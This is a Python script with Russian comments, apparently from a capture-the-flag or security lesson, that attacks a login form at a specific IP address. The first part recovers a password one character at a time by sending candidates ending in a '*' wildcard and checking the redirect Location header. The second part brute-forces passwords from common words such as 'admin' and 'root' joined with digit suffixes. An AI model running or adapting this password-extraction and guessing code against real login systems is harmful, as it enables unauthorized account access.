# Подбираем пароль к http://165.22.115.189:31441/login
# Модуль requests = умеет отправлять HTTP-запросы
#
# HTTP Status Code:
# 200 - ОК
# 300 - Redirect
# 400 - Client Error
# 500 - Server Error

# HTTP Method:
# GET - получение данных
# POST - изменение данных

# HTTP Header (служебная информация)
# Location - куда происходит редирект
import requests  # Подключаем модуль requests

# *a* - есть ли в пароле буква а?
# a* - начинается ли пароль с буквы а?

def try_password(password):
    # Представим что пароль "AHAHAHA" = "*H*"
    URL = "http://login"
    payload = {"username": "?", "password": password}

    # Отправляем запрос, и полученный ответ кладем в переменную response
    # allow_redirects - не следовать за редиректами автоматически
    response = requests.post(URL, payload, allow_redirects=False)

    # Если статус код не 302
    if response.status_code != 302:
        print("Wrong status code")

    if response.headers["Location"] == '/':
        return True # Успех
    else:
        return False # Неуспех
# password = abc
# a* (V)
# aa* (X)
# ab* (V)
# aba* (X)
# abb* (X)
# abc* (V)
# abc  (V)
symbols = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"

prefix = "" # Изначально мы не знаем ни одного символа

while True: # Бесконечно выполнять цикл, пока не произойдет exit
    # Для каждого символа из списка
    for symbol in symbols:
        candidate = prefix + symbol # Создаем пароль-кандидат
        if try_password(candidate + "*"):
            print("Success", candidate)
            prefix = candidate # Обновляем префикс только что найденным кандидатом
            if try_password(candidate):
                print("FULL PASSWORD FOUND")
                exit(0)
            break


def try_password(login, password):
    URL = "http://login-with-password"
    payload = {"login": login,  "password": password}

    response = requests.post(URL, payload)
    if response.status_code != 200:
        print(f"Wrong status code: {response.status_code}")

    # Проверить что 'Content-Type': 'application/json'

    data = response.json()
    if data["result"]:
        print("Correct login/passwrod")
        return True
    else:
        print("Wrong login/password")
        return False

login = ""

# len = 8
# symbols = a-z0-9
# word + digits

words = ["admin", "password", "root", "mila"]
digits = ["1234", "0000", "9999", "2023"]

for word in words:
    for digit in digits:
        candidate = word + digit
        print(f"candidate {candidate}")
        try_password(login, candidate)